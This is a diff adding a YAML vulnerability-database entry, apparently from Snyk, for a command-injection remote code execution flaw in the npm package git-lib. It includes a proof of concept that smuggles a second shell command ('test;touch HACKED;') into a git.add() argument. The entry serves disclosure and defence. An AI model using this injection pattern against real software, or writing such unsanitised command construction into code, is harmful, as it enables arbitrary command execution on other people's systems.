@@ -1,0 +1,29 @@
+---
+- id: snykio:npm:git-lib:1012734
+  title: Remote Code Execution (RCE)
+  description: "[git-lib][1] is an a library with different git commands for uses.\n\nAffected
+    versions of this package are vulnerable to Remote Code\nExecution (RCE). A user
+    input is formatted inside a command that will be\nexecuted without any check.\n\n###
+    PoC by mik317   {#poc-by-mik317}\n\n* Create the following PoC file:\n^\n\n    //
+    poc.js\n    var git = require(\"git-lib\");\n    \n    git.add(\"test;touch HACKED;\").then(function(){\n
+    \       /** successfully added **/\n    }).catch(function(err){\n        /** unsuccessful
+    **/\n    });\n\n* Check there aren\\'t files called `HACKED`\n* Execute the following
+    commands in another terminal:\n^\n\n    npm i git-lib # Install affected module\n
+    \   git init # Avoid problems with *git*\n    node poc.js #  Run the PoC\n\n*
+    Recheck the files: now `HACKED` has been created\n  ## Remediation   {#remediation}\n
+    \ \n  There is no fixed version for `git-lib`.\n  ## References   {#references}\n\n*
+    [HackerOne Report][2]\n* [Vulnerable Code][3]\n\n\n\n[1]: https://www.npmjs.com/package/git-lib\n[2]:
+    https://hackerone.com/reports/718241\n[3]: https://github.com/shime/git-lib/blob/master/index.js#L32\n"
+  affected_package: git-lib
+  vulnerable_versions:
+  - "*"
+  severity: medium
+  package_manager: npm
+  cwe:
+  - CWE-94
+  disclosed_date: 2020-09-24
+  created_date: 2020-09-25
+  last_modified_date: 2020-09-25
+  credit:
+  - mik317
+  source_url: https://snyk.io/vuln/SNYK-JS-GITLIB-1012734
